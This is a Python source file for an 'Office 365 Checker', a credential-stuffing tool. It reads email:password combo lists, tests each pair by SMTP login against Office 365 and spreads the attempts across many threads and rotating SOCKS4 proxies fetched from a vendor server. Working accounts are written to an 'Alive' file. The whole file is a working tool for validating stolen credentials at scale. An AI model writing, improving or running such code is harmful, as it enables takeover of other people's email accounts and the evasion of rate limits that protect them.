import smtplib
import os
from os import listdir, mkdir
from os.path import isfile, join, isdir
from threading import Thread
import time
from datetime import datetime
import encodings.idna
import socks
import socket
import requests
import json
import sys
import msvcrt
import base64

TOOL_VERSION = '1.9'
isOutputBusy = False
glDataIndex = 0
completedDataIndex = 0

MAX_LOCAL_THREAD_NUM = 50

def readInput(fileName):
    outData = []
    try:
        try:
            file1 = open(fileName, 'r')
        except:
            file1 = open(fileName, 'r', encoding="UTF-8")
        lines = file1.readlines()
        content = [x.strip() for x in lines]
        for acc in content:
            if ':' in acc and '@' in acc:
                outData.append(acc)
    except Exception as e:
        #print(str(e))
        pass
    return outData

def readFolder(folderName):
    outData = []
    onlyfiles = [f for f in listdir(folderName) if isfile(join(folderName, f))]
    for fileName in onlyfiles:
        fileData = readInput(folderName + "/" + fileName)
        for data in fileData:
            outData.append(data)
    return outData

def smtp_login(email, password):
    res = ''
    try: 
        server = smtplib.SMTP('smtp.office365.com', 587, timeout= 15.0)
        server.ehlo()
        server.starttls()

        res = server.login(email,password)[1].decode('utf-8')
    except Exception as e:
        res = str(e)
    return res

def smtp_login_proxy(proxy, email, password):
    res = ''
    try: 
        tIdx = proxy.rindex(':')
        ip = proxy[0:tIdx]
        port = int(proxy[(tIdx+1):])

        socket.setdefaulttimeout(10)
        socks.setdefaultproxy(socks.SOCKS4, ip, port, False)
        socks.wrapmodule(smtplib)

        server = smtplib.SMTP('smtp.office365.com', 25, timeout= 15.0)
        server.ehlo()
        server.starttls()

        res = server.login(email,password)[1].decode('utf-8')
    except Exception as e:
        res = str(e)
    return res

def parseResult(login_res, data, dataNum, isForProxy = False):
    res = False
    status = ''

    if 'Authentication successful' in login_res:
        status = "Alive"
        res = True
    elif 'Authentication unsuccessful' in login_res:
        status = "Dead"
        res = True
    elif("Mailbox cannot be accessed" in login_res):
        status = "Undefined"
        res = True
    elif('Connection unexpectedly closed' in login_res):
        status = "Undefined"
    elif('codec can\'t encode character' in login_res):
        status = "Undefined"
        res = True
    else:
        status = "Undefined"
    if not isForProxy or res == True:
        writeOutput(status, data, dataNum)
    return res

def writeOutput(status, data, dataNum):
    global isOutputBusy
    global completedDataIndex

    while(isOutputBusy):
        time.sleep(0.001)

    isOutputBusy = True

    dt = datetime.now().strftime('%H:%M:%S %d/%m/%Y')
    strTime = ' - ' + str(dt)

    print('(' + str(completedDataIndex + 1) + '/' + str(dataNum) + ') ' + status + " => " + data + strTime)

    fileName = status + '.txt'

    with open(fileName, 'a', encoding="UTF-8") as f:
        f.write("%s\n" % data)

    isOutputBusy = False

def localThreadFunction(inputData,deadDict):
    global glDataIndex
    global completedDataIndex

    totalDataNum = len(inputData)
    while(True):
        if(glDataIndex >= totalDataNum):
            break
        dataIndex = glDataIndex
        glDataIndex = glDataIndex + 1
        data = inputData[dataIndex]
        if not data in deadDict:
            email = data.split(':')[0]
            password = data.split(':')[1]

            login_res = smtp_login(email,password)
            #print(login_res)
            parseResult(login_res,data, totalDataNum)
            completedDataIndex = completedDataIndex + 1

def proxyThreadFunction(order,inputData,deadDict, proxies):
    global glDataIndex
    global completedDataIndex

    totalDataNum = len(inputData)
    proxyNum = len(proxies)
    proxyIndex = order % proxyNum

    while(True):
        if(glDataIndex >= totalDataNum):
            break
        currentDataIndex = glDataIndex
        glDataIndex = glDataIndex + 1
        data = inputData[currentDataIndex]

        if data in deadDict:
            completedDataIndex = completedDataIndex + 1
        else:
            while(True):
                if(proxyIndex >= proxyNum):
                    proxyIndex = 0
                proxy = proxies[proxyIndex]

                email = data.split(':')[0]
                password = data.split(':')[1]

                login_res = smtp_login_proxy(proxy, email,password)
                #print(login_res)

                res = parseResult(login_res, data, totalDataNum, True)
                if(res == True):
                    completedDataIndex = completedDataIndex + 1
                    break

                proxyIndex = proxyIndex + 1

def checkForUpdate():
    try:
        x = requests.get('https://kichhoat24h.com/api/tool-365-check-update')
        strRes = x.text
        subRes = strRes.split('\n')
        if(subRes[0] == 'true'):
            latestVersion = subRes[1]
            if(latestVersion != TOOL_VERSION):
                return latestVersion
            else:
                return ''
    except:
        return 'fail'
    return "fail"

def getProxies(email, password):
    proxies = []
    try:
        data = {'email': email, 'password': password}
        x = requests.post('https://kichhoat24h.com/api/tool-365-get-proxies',data)
        strRes = x.text
        subRes = strRes.split('\n')
        login_res = subRes[0]
        if(login_res == 'true'):
            proxies = subRes[1].split(',')
    except:
        pass
    return proxies

def secure_password_input(prompt=''):
    p_s = ''
    proxy_string = [' '] * 32
    while True:
        sys.stdout.write('\x0D' + prompt + ''.join(proxy_string))
        c = msvcrt.getch()
        if c == b'\r':
            break
        elif c == b'\x08':
            p_s = p_s[:-1]
            proxy_string[len(p_s)] = " "
        else:
            proxy_string[len(p_s)] = "*"
            p_s += c.decode()

    sys.stdout.write('\n')
    return p_s

def login(email, password):
    if(email == "" or password == ""):
        return (False,'Email or password is empty!')
    try:
        data = {'email': email, 'password': password}
        x = requests.post('https://kichhoat24h.com/api/tool-365-login',data)
        strRes = x.text
        subRes = strRes.split('\n')
        login_res = subRes[0]
        if(login_res == 'true'):
            return (True,'')
        else:
            return (False,subRes[1])
    except:
        pass
    return (False,'Connect to server fail!')

def loadAccount():
    try:
        with open('login_token.dat', 'r') as file:
            base64_message = file.read()
            base64_bytes = base64_message.encode('ascii')
            message_bytes = base64.b64decode(base64_bytes)
            message = message_bytes.decode('ascii')
            return message.split('\n')
    except:
        pass
    return ["",""]

def saveAccount(email, password):
    text_file = open("login_token.dat", "w")
    message = email + "\n" + password
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    text_file.write(base64_message)
    text_file.close()

def main():
    print("")
    print("Office 365 Checker v" + TOOL_VERSION + " by mrphunghuy")
    print("Website: https://kichhoat24h.com")
    
    print("")
    print("Checking for update...")
    res = checkForUpdate()
    if(res != ""):
        if(res == "fail"): #Connection error
            print("Connect to server fail.\n")
        else:
            print("New update version " + res + " is available. Please download it at: https://files.kichhoat24h.com/download/Tools")
        return
    print("You are using the latest version.\n")

    #Load Account
    loadedRes = loadAccount()
    userID = loadedRes[0]
    password = loadedRes[1]
    loginRes = login(userID,password)
    if(loginRes[0] == True):
        print("Login successfully!\n")
    else:
        #Manual Login
        print("Login by using KichHoat24H.Com account") 
        while(True):
            userID = str(input("Email: "))
            password = secure_password_input("Password:")
            loginRes = login(userID,password)
            if(loginRes[0] == True):
                print("Login successfully!\n")
                #Save Account
                saveAccount(userID,password)
                break
            else:
                print(loginRes[1])

    print("Reading input files...")
    inputData = []
    if(not isdir("Data")):
        print("Data folder not found! Please drop all .txt data files into \"Data\" folder.")
        mkdir('Data')
        return
    else:
        inputData = readFolder("Data")
        if(len(inputData) == 0):
            print("Data is empty!")
            return
    print("Total accounts: " + str(len(inputData)))

    deadData = readInput("Dead.txt")
    deadDict = dict.fromkeys(deadData)

    print("")
    print("Reading local proxies data...")
    localProxies = []
    if(not isdir("Proxies")):
        print("Proxies folder not found! Please drop all .txt proxies files into \"Proxies\" folder.")
        mkdir('Proxies')
    else: 
        localProxies = readFolder('Proxies')
        if(len(localProxies) == 0):
            print("Local proxies is empty!")

    print("")
    print("Getting proxies from server...")
    proxies = getProxies(userID,password)
    if(len(proxies) == 0):
        print("No proxy data on server!")

    proxies.reverse() #to get latest proxies

    proxies = localProxies + proxies
    print("Total proxies: " + str(len(proxies)))

    print("")
    threadNum = 0
    while(True):
        threadNum = int(input("Enter number of threads: "))
        if(threadNum > 0):
            break
    
    print("")
    print("Checking data...")
    threadList = []
    if(threadNum <= MAX_LOCAL_THREAD_NUM):
        for i in range(threadNum):
            thread = Thread(target = localThreadFunction, args = (inputData,deadDict))
            thread.start()
            threadList.append(thread)
            time.sleep(0.005)
    else:
        for i in range(MAX_LOCAL_THREAD_NUM):
            thread = Thread(target = localThreadFunction, args = (inputData,deadDict))
            thread.start()
            threadList.append(thread)
            time.sleep(0.005)

        for i in range (MAX_LOCAL_THREAD_NUM, threadNum):
            thread = Thread(target = proxyThreadFunction, args = (i,inputData,deadDict,proxies))
            thread.start()
            threadList.append(thread)
            time.sleep(0.005)

    for t in threadList:
        t.join()
    
    print("Complete.")

if __name__ == "__main__":
    main()
    os.system("pause")
